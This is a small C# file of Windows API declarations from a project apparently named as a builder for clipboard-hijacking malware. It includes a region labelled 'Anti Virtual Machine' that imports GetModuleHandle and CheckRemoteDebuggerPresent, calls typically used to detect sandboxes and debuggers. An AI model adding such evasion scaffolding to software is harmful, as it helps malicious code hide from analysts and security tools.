using System;
using System.Runtime.InteropServices;

namespace ClipPurSEditionBuilder
{
    internal static class NativeMethods
    {
        #region For Animation

        [DllImport("user32.dll")]
        public static extern bool AnimateWindow(IntPtr hWnd, int time, Enums.AnimateWindowFlags flags);

        #endregion

        #region For Anti Virtual Machine

        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("Kernel32.dll", SetLastError = true, ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)]ref bool isDebuggerPresent);

        #endregion

        #region For Null Focus

        [DllImport("user32.dll")]
        public extern static IntPtr SetFocus(IntPtr hWnd);

        #endregion
    }
}